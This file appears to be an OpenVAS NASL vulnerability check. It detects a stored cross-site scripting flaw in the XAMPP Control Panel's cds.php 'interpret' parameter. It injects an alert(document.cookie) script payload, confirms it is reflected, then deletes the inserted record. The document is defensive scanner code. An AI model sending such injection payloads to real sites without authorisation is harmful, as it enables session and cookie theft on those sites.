###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_xampp_control_panel_xss_vuln.nasl 34361 2014-01-22 17:43:28Z Jan$
#
# XAMPP Control Panel 'interpret' Parameter Cross Site Scripting Vulnerability
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:apachefriends:xampp";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804078");
  script_version("$Revision: 13549 $");
  script_bugtraq_id(64974);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2019-02-08 21:55:13 +0100 (Fri, 08 Feb 2019) $");
  script_tag(name:"creation_date", value:"2014-01-22 17:43:28 +0530 (Wed, 22 Jan 2014)");
  script_name("XAMPP Control Panel 'interpret' Parameter Cross Site Scripting Vulnerability");

  script_tag(name:"summary", value:"This host is installed with XAMPP and is prone to cross site scripting
  vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request and check whether it is able to read
  cookie or not.");

  script_tag(name:"insight", value:"Flaws is due to the cds.php script does not validate input to the 'interpret'
  parameter before returning it to users.");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary HTML and
  script code in a user's browser session in the context of an affected site.");

  script_tag(name:"affected", value:"XAMPP Control Panel version 3.2.1, Other versions may also be affected.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release,
  disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");
  script_xref(name:"URL", value:"http://1337day.com/exploit/21761");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/90520");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/124788");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_xampp_detect.nasl");
  script_mandatory_keys("xampp/installed");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = dir + "/cds.php?interpret=%22><script>alert(document.cookie)</script>&titel=title&jahr=1" ;
req = http_get(item:url, port:port);
res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

if(res && res =~ "^HTTP/1\.[01] 200" && ">CD Collection" >< res) {

  if(http_vuln_check(port:port, url:string(dir, "/cds-fpdf.php"), check_header:TRUE, pattern:"<script>alert\(document.cookie\)</script>")) {

    delId = eregmatch(string:res, pattern:'alert.document.cookie.&lt;/script&gt;</b>'+
                                          '</td><td class=tabval>title&nbsp;</td><td class=tabval>1&nbsp;<'+
                                          '/td><td class=tabval><a onclick="return confirm..Sure...;" href'+
                                          '=cds.php.action=del&id=([0-9]*)');

    req = http_get(item:string(dir, "/cds.php?action=del&id=", delId[1]), port:port);
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

    if(res && res =~ "^HTTP/1.[01] 200" && "alert(document.cookie)" >!< res) {
      report = report_vuln_url(port:port, url:url);
      security_message(port:port, data:report);
      exit(0);
    } else {
      report  = report_vuln_url(port:port, url:url);
      report += '\n\nSome data was inserted at ' + dir + '/cds.php to check the vulnerability. Please remove it.';
      security_message(port:port, data:report);
      exit(0);
    }
  }
}

exit(99);